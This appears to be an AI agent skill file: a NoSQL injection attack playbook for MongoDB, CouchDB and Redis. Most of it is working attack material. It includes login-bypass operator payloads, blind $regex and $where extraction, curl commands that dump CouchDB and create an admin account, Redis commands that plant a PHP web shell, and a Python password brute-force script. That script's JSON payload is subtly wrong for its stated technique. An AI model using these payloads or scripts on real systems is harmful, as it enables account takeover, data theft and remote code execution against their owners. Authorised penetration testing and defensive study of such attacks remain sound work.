---
name: nosql-injection
description: >-
  NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse.
---

# SKILL: NoSQL Injection — Expert Attack Playbook

## 1. CORE CONCEPT — OPERATOR INJECTION

**SQL Injection** breaks out of string literals.  
**NoSQL Injection** injects **query operators** that change query logic.

MongoDB example — normal query:
```javascript
db.users.find({username: "alice", password: "secret"})
```

Injection via JSON operator:
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
→ Becomes: `find({username:"admin", password:{$gt:""}})` → password > "" → always true!

---

## 2. MONGODB — LOGIN BYPASS

### JSON Body Injection
```json
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### PHP `$_POST` Array Injection (URL-encoded form)
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### Ruby / Python `params` Array Injection
```
?username[%24ne]=invalid&password[%24ne]=invalid
```
`%24` = URL-encoded `$`

---

## 3. MONGODB OPERATORS FOR INJECTION

| Operator | Meaning | Use Case |
|---|---|---|
| `$ne` | not equal | `{"password": {"$ne": "x"}}` → always matches |
| `$gt` | greater than | `{"password": {"$gt": ""}}` → all non-empty passwords match |
| `$gte` | greater or equal | Similar to $gt |
| `$lt` | less than | `{"password": {"$lt": "~"}}` → all ASCII match |
| `$regex` | regex match | `{"username": {"$regex": "adm.*"}}` |
| `$where` | JS expression | MOST DANGEROUS — code execution |
| `$exists` | field exists | `{"admin": {"$exists": true}}` |
| `$in` | in array | `{"username": {"$in": ["admin","user"]}}` |

---

## 4. BLIND DATA EXTRACTION VIA $REGEX

```json
// Does admin's password start with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}

// Does admin's password start with 'b'?
{"username": "admin", "password": {"$regex": "^b"}}

// Continue: narrow down each position
{"username": "admin", "password": {"$regex": "^ab"}}
```

**Response difference**: successful login vs failed login = boolean oracle.

Automate with NoSQLMap or the Python template in §13.

---

## 5. MONGODB $WHERE INJECTION (JS EXECUTION)

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}

// Blind extraction via timing:
{"$where": "if(this.username=='admin'){sleep(5000);return true;}else{return false;}"}

// Regex via JS:
{"$where": "this.username.match(/^adm/) && true"}
```

---

## 6. AGGREGATION PIPELINE INJECTION

```javascript
// Vulnerable code:
db.collection.aggregate([
  {$match: {category: userInput}},  // userInput = {"$ne": null}
  ...
])
```

```json
// Inject operators:
{"$ne": null}      // matches all categories
{"$regex": ".*"}   // matches all
```

---

## 7. HTTP PARAMETER POLLUTION FOR NOSQL

```
?filter[$ne]=invalid
→ parsed as: filter = {$ne: "invalid"}
→ NoSQL operator injection
```

---

## 8. COUCHDB ATTACKS

```bash
# List databases:
curl http://target.com:5984/_all_dbs

# Read all documents:
curl http://target.com:5984/DATABASE_NAME/_all_docs?include_docs=true

# Create admin account (if anonymous access allowed):
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password"'
```

---

## 9. REDIS INJECTION

```
# Via SSRF or direct injection:
SET key "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

---

## 10. DETECTION PAYLOADS

```
{ $ne: 1 }
{"$gt": ""}
{"$ne": "invalid"}
[$ne]=invalid
[$gt]=
true, $where: '1 == 1'
', sleep(1000)
```

**JSON variant**: change Content-Type to `application/json` and send:
```json
{"username": "admin", "password": {"$ne": ""}}
```

---

## 11. NOSQL VS SQL — KEY DIFFERENCES

| Aspect | SQLi | NoSQLi |
|---|---|---|
| Language | SQL syntax | Query operator objects |
| Injection vector | String concatenation | Object/operator injection |
| Common signal | Quote breaks response | `{$ne:x}` changes response |
| Extraction method | UNION / error-based | `$regex` character oracle |
| Auth bypass | `' OR 1=1--` | `{"password":{"$ne":""}}` |
| OS command | xp_cmdshell (MSSQL) | Rare (need `$where` + CVE) |

---

## 12. TESTING CHECKLIST

```
[] Test login fields with: {"$ne": "invalid"} JSON body
[] Test URL-encoded forms: password[$ne]=invalid
[] Test $regex for blind enumeration of field values
[] Try $where with sleep() for time-based blind
[] Check 5984 port for CouchDB (unauthenticated admin)
[] Check 6379 port for Redis (unauthenticated)
[] Try Content-Type: application/json on form endpoints
[] Monitor for operator-related error messages ("BSON" "operator" "$not allowed")
```

---

## 13. BLIND NoSQL EXTRACTION AUTOMATION

### $regex Character-by-Character Extraction (Python)

```python
import requests
import string

url = "http://target/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
password = ""

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{c}.*"
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            found = True
            print(f"Found: {password}")
            break
    if not found:
        break

print(f"Final password: {password}")
```

### $where Data Exfil via Timing

```javascript
// Extract field character by character
{"$where": "if(this.password[0]=='a'){sleep(3000); return true;} return false;"}
```

### $lookup Cross-Collection Access

```javascript
{ $lookup: {
    from: "admin_users",
    localField: "user_id",
    foreignField: "_id",
    as: "leaked"
}}

// $out to write results to accessible collection:
{ $out: "public_collection" }
```
